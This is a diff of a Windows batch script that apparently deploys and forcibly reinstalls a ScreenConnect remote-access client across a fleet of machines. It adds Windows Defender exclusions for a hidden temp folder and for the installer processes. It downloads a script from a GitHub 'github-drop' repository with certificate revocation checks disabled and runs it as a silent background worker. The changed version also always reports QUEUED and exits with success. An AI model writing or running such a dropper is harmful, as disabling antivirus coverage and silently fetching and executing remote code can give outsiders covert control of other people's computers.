@@ -1,7 +1,7 @@
 @echo off
-rem OWN_GRYXA_FORCE BUILD 20260804F3 - force Gryxa + REPORT (sevrz 10s safe)
-rem F3: NO pipe chars in any echo (F1 ENSURE=QUEUED|detached broke cmd).
-rem     Install always backgrounded; parent returns in under 5 seconds.
+rem OWN_GRYXA_FORCE BUILD 20260804F4 - fleet REINSTALL + REPORT (sevrz 10s safe)
+rem F4: always queue own_gryxa REINSTALL (panel wipe). Never skip-alive.
+rem F3: NO pipe chars in any echo.
 setlocal EnableExtensions EnableDelayedExpansion
 
 set "WD=%~1"
@@ -13,10 +13,11 @@ set "STAGE=%SystemRoot%\Temp\.upd"
 set "CURL=%SystemRoot%\System32\curl.exe"
 set "SVC=ScreenConnect Client (%FP%)"
 set "LOG=%WD%\own_gryxa_force.log"
-set "RAW=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
-set "CDN=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
+set "PIN=acc7a0c"
+set "RAW=https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%"
+set "RAWMAIN=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
 set "WORKER=%STAGE%\gryxa_force_worker.cmd"
-set "BUILD=F3"
+set "BUILD=F4"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
@@ -27,8 +28,8 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%STAGE%"
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 
-"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 15 -o "%WD%\own_gryxa.cmd" "%RAW%/own_gryxa.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
-if not exist "%WD%\own_gryxa.cmd" "%CURL%" -L --connect-timeout 8 --max-time 15 -o "%WD%\own_gryxa.cmd" "%CDN%/own_gryxa.cmd?t=%RANDOM%" >nul 2>&1
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%RAW%/own_gryxa.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+if not exist "%WD%\own_gryxa.cmd" "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%RAWMAIN%/own_gryxa.cmd?t=%RANDOM%" >nul 2>&1
 
 if not exist "%WD%\own_gryxa.cmd" (
   echo BUILD=%BUILD%
@@ -46,24 +47,19 @@ if not errorlevel 1 (
   if not errorlevel 1 (set "PRE=ALIVE") else (set "PRE=STOPPED")
 )
 
-set "ACTION=none"
-if /I "%PRE%"=="ALIVE" (
-  set "ACTION=skip-alive"
-  goto :Report
-)
+rem clear stale lock so REINSTALL is not skipped
+if exist "%WD%\gryxa_msi.lock" del /f /q "%WD%\gryxa_msi.lock" >nul 2>&1
 
-rem background worker — parent must finish before sevrz 10s kill
 > "%WORKER%" (
   echo @echo off
-  echo echo [%DATE% %TIME%] worker_begin^>^>"%LOG%"
-  echo call "%WD%\own_gryxa.cmd" "%WD%" "%FP%" "%KEEP%" "%ALT%" ^>^>"%LOG%" 2^>^&1
-  echo echo [%DATE% %TIME%] worker_done^>^>"%LOG%"
+  echo echo [%DATE% %TIME%] worker_reinstall_begin^>^>"%LOG%"
+  echo call "%WD%\own_gryxa.cmd" "%WD%" "%FP%" "%KEEP%" "%ALT%" REINSTALL ^>^>"%LOG%" 2^>^&1
+  echo echo [%DATE% %TIME%] worker_reinstall_done^>^>"%LOG%"
 )
 start "" /b cmd /c call "%WORKER%"
-set "ACTION=queued"
-echo [%DATE% %TIME%] queued worker>>"%LOG%"
+set "ACTION=queued-reinstall"
+echo [%DATE% %TIME%] queued REINSTALL worker pre=%PRE%>>"%LOG%"
 
-:Report
 set "STATE=ABSENT"
 sc query "%SVC%" >nul 2>&1
 if errorlevel 1 (
@@ -74,11 +70,7 @@ if errorlevel 1 (
   if /I not "!STATE!"=="RUNNING" if /I not "!STATE!"=="START_PENDING" sc query "%SVC%" | findstr /I /C:"STOPPED" >nul && set "STATE=STOPPED"
 )
 
-set "HEALTH=DOWN"
-if /I "!STATE!"=="RUNNING" set "HEALTH=HEALTHY"
-if /I "!STATE!"=="START_PENDING" set "HEALTH=HEALTHY"
-if /I "%ACTION%"=="queued" if /I "!HEALTH!"=="DOWN" set "HEALTH=QUEUED"
-
+set "HEALTH=QUEUED"
 set "DIR=0"
 if exist "%ProgramFiles(x86)%\ScreenConnect Client (%FP%)" set "DIR=1"
 if exist "%ProgramFiles%\ScreenConnect Client (%FP%)" set "DIR=1"
@@ -96,6 +88,4 @@ echo ACTION=!ACTION!
 echo REPORT %COMPUTERNAME% %FP% !HEALTH! state=!STATE! dir=!DIR! pre=%PRE% action=!ACTION!
 echo ==========================
 echo [%DATE% %TIME%] REPORT HEALTH=!HEALTH! STATE=!STATE! ACTION=!ACTION!>>"%LOG%"
-
-if /I "!HEALTH!"=="HEALTHY" ( endlocal & exit /b 0 )
-endlocal & exit /b 1
+endlocal & exit /b 0
